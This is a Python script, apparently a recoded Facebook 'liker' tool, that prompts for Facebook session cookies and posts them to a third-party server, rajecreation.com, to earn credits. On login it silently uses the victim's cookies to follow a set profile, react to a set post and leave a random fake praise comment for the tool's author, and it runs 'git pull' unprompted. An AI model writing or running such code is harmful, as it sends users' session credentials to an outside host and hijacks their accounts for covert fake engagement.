#ngapain bang? recode doang ga ngasih bintang ampasss
import requests,json,re,random,time,os,sys
from time import sleep
from bs4 import BeautifulSoup as bs
b="\033[94m"
c="\033[96m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{g}√{d}]{p}"
er=f"{d}[{r}!{d}]{p}"
pr=f"{d}[{c}?{d}]{p}"
mbasic="https://mbasic.facebook.com{}"
###################awalan#####################
def clear():
    os.system("cls" if os.name == "nt" else "clear")
def baner():
    clear()
    print('\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n\x1b[1;97m-------------------------------------------------\nRECODED BY : D3M09\nFACEBOOK   : MD ANARUL ISLAM\n-------------------------------------------------')

def agent():
    ua={"user-agent":"Dart/2.14 (dart:io)","version":"8.0.2","accept-encoding":"gzip","packagename":"com.datta.liker","device":"true","host":"rajecreation.com","appname":"Raje Liker","content-type":"application/x-www-form-urlencoded; charset=utf-8","versioncode":"18","id":"QQ3A.200605.002","token":"3075dda32ffbbe88"}
    return ua
def useragent():
    try:
        usr=open("useragent").read()
    except FileNotFoundError:
        usr=input(f"{er}Put your user-agent\n{pr} {ab}>>> {c}")
    with open("useragent","w") as us:
        us.write(usr)
    return usr
#####################login#######################
def login():
    os.system('git pull')
    ua=agent()
    try:
        cokie=open("cookies").read()
    except FileNotFoundError:
        cokie=input(f"{er}Put your cookies\n{pr} {ab}>>> {c}")
    data={"cookie":cokie,"access_token":"","loginType":"FB","refby":"null"}
    req=requests.post("https://rajecreation.com/rajeliker/v8/login.php",data=data,headers=ua).text
    if "Login success!" in req:
       with open("cookies","w") as ck:
            ck.write(data["cookie"])
       try:
           lg=ses.get(mbasic.format("/me"),cookies={"cookie":cokie}).text
           lg=bs(lg,"html.parser").find("a",string="Bahasa Indonesia")["href"]
       except:
           pass
       try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies={"cookie":cokie}).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
       except:
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies={"cookie":cokie})
       except:
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
       except:
           pass
       js=json.loads(req)
       return {"name":js["data"]["name"],"id":js["data"]["myid"],"cookie":js["data"]["cok"]}
    else:
       print(f"{er}Login Failed")
       try:
           os.system("rm cookies")
       except:
           pass
       os.system("python run.py")
#####################main#####################
def earn():
    ua=agent()
    data={"user_id":id,"type":"FB","code":cokie}
    req=requests.post("https://rajecreation.com/rajeliker/v8/earn.php",data=data,headers=ua).text
    if "Credit added success!" in req:
       res=requests.post("https://rajecreation.com/rajeliker/v8/timer.php",data={"user_id":id,"type":"FB"},headers={"user-agent":"Dart/2.14 (dart:io)","content-type":"application/x-www-form-urlencoded; charset=utf-8","accept-encoding":"gzip","host":"rajecreation.com"}).json()
       print(f"\r{dn}Credit : {c}"+str(res["active"]),end="")
       return res["active"]
    else:
       print(f"\r{er}Failed Earn credit")
def userinfo():
    print(f"{p}Login as : {c}{name}")
    print(f"{p}ID       : {c}{id}")
    print(f"{ab}-----------------------------------------------{d}")
####################menu######################
def menu():
    baner()
    userinfo()
    print(f"""{p}{c}01{ab}. {p}Earn Credit
{c}00{ab}. {p}Exit
{ab}-----------------------------------------------{d}""")
    pilih_menu()
def pilih_menu():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       baner()
       sys.exit(f"{er}Thanks For Using My Script")
    elif choice == "01" or choice == "1":
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               earn()
               sleep(1)
           except:
               break
       print()
       input(f"{d}[{c} Press Enter To Back {d}]")
       os.system("python run.py")
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_menu()
if __name__=="__main__":
   baner()
   usa=useragent()
   ses=requests.Session()
   ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":usa,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":"https://mbasic.facebook.com/","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
   try:
      masuk=login()
      cokie=masuk["cookie"]
      id=masuk["id"]
      name=masuk["name"]
      menu()
   except Exception as e:
      sys.exit(f"{er}{e}")
